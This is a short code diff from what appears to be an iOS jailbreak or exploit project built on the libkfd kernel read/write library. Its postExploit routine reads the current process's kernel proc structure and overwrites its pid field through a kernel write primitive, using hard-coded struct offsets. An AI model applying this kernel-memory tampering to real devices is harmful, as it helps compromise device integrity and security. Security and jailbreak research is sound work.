@@ -6,7 +6,6 @@
 #import <stdarg.h>
 #import "Utilities.h"
 #import "libkfd.h"
-#import "libkfd/krkw/kwrite/kwrite_IOSurface.h"
 
 uint64_t off_p_pid = 0x68;
 uint64_t off_p_task = 0x10;
@@ -36,8 +35,7 @@ void postExploit(void) {
     }
     printf("proc: 0x%llx\n", proc);
     printf("pid: 0x%u\n", kread32(proc + off_p_pid));
-    //kwrite32(proc + off_p_pid, 200);
-    kwrite_IOSurface_kwrite_u64(((struct kfd*)_kfd), proc + off_p_pid, 200);
+    kwrite32(proc + off_p_pid, 200);
     printf("pid: 0x%u\n", kread32(proc + off_p_pid));
     printf("Done! 8\n");
 }
@@ -78,6 +76,5 @@ void kwrite32(uint64_t where, uint32_t what) {
 void kwrite64(uint64_t where, uint64_t what) {
     uint64_t _buf[1] = {};
     _buf[0] = what;
-    printf("where: 0x%llx, what: %llx\n", where, _buf);
     kwrite(_kfd, &_buf, where, sizeof(uint64_t));
 }
